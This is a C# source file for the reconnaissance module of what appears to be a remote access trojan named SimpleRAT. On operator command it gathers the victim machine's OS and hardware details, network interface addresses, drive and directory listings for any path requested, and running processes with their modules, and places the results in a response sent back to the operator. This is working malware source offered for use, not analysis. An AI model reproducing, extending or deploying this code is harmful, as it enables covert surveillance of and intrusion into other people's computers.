using SimpleRAT.Communication;
using SimpleRAT.Communication.ResponseTypes;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace SimpleRAT.Features
{
    public class InfoGatherer : BaseFeature
    {
        public static InfoGatherer Instance => new InfoGatherer();

        internal InfoGatherer() : base(Commands.GatherAllInfo) { }

        public override void Handle(Context context)
        {
            if (context.Request.Command.HasFlag(Commands.GatherProcessInfo))
                GatherProcessInfo(context);
            if (context.Request.Command.HasFlag(Commands.GatherFSInfo))
                GatherFSInfo(context);
            if (context.Request.Command.HasFlag(Commands.GatherNetworkInfo))
                GatherNetworkInfo(context);
            if (context.Request.Command.HasFlag(Commands.GatherSystemInfo))
                GatherOSInfo(context);
        }
        private void GatherOSInfo(Context context)
        {
            var ohw = new OpenHardwareMonitor.Hardware.Computer();
            ohw.CPUEnabled = ohw.GPUEnabled = ohw.HDDEnabled = ohw.MainboardEnabled = ohw.RAMEnabled = true;
            ohw.Open();
            context.Response.Content["info.system"] = new SystemInfo()
            {
                OS = Environment.OSVersion.VersionString,
                HW = ohw.Hardware.Select(x => new HardwareInfo()
                {
                    Type = x.HardwareType.ToString(),
                    Name = x.Name
                }).ToArray()
            };
        }

        private void GatherNetworkInfo(Context context)
        {
            context.Response.Content["info.network"] =
                NetworkInterface.GetAllNetworkInterfaces().Select(x =>
                {
                    var props = x.GetIPProperties();

                    return new NetworkInfo()
                    {
                        Id = x.Id,
                        Name = x.Name,
                        Status = x.OperationalStatus.ToString(),
                        Mac = x.GetPhysicalAddress().ToString(),
                        Description = x.Description,
                        DhcpAddresses = props.DhcpServerAddresses?.Cast<IPAddress>().Select(a => a.ToString()).ToArray(),
                        DnsAddresses = props.DnsAddresses?.Cast<IPAddress>().Select(a => a.ToString()).ToArray(),
                        GatewayAddresses = props.GatewayAddresses?.Cast<GatewayIPAddressInformation>().Select(a => a.Address.ToString()).ToArray(),
                        UnicastAddresses = props.UnicastAddresses?.Cast<IPAddressInformation>().Select(a => a.Address.ToString()).ToArray(),
                        MulticastAddresses = props.MulticastAddresses?.Cast<IPAddressInformation>().Select(a => a.Address.ToString()).ToArray(),
                        AnycastAddresses = props.AnycastAddresses?.Cast<IPAddressInformation>().Select(a => a.Address.ToString()).ToArray(),
                    };
                }).ToArray();
        }

        private void GatherFSInfo(Context context)
        {
            if (!context.Request.Arguments.ContainsKey("directory"))
            {
                context.Response.Content["info.fs"] = System.IO.DriveInfo.GetDrives().Where(x => x.IsReady).Select(x => x.RootDirectory.FullName).ToArray();
            }
            else
            {
                try
                {
                    var dir = new System.IO.DirectoryInfo(context.Request.Arguments["directory"]);
                    context.Response.Content["info.fs"] = new DirectoryInfo()
                    {
                        Path = dir.FullName,
                        Directories = dir.EnumerateDirectories().Select(x => x.Name).ToArray(),
                        Files = dir.EnumerateFiles().Select(x => x.Name).ToArray()
                    };
                }
                catch
                {
                    context.Response.Content["info.fs"] = null;
                }
            }
        }

        private void GatherProcessInfo(Context context)
        {
            context.Response.Content["info.processes"] =
                Process.GetProcesses().Where(
                    p =>
                    {
                        try
                        {
                            var n = p.MachineName + p.ProcessName + p.Id.ToString();
                            var m = p.Modules.Cast<ProcessModule>();
                            return true;
                        }
                        catch
                        {
                            return false;
                        }
                    })
                    .Select(p => new ProcessInfo()
                    {
                        PID = p.Id,
                        Name = p.ProcessName,
                        Modules = p.Modules.Cast<ProcessModule>().Where(m=>
                        {
                            try
                            {
                                var a = m.ModuleName;
                                return true;
                            }
                            catch
                            {
                                return false;
                            }
                        }).Select(x => x.ModuleName).ToArray()
                    }).ToArray();
        }
    }
}
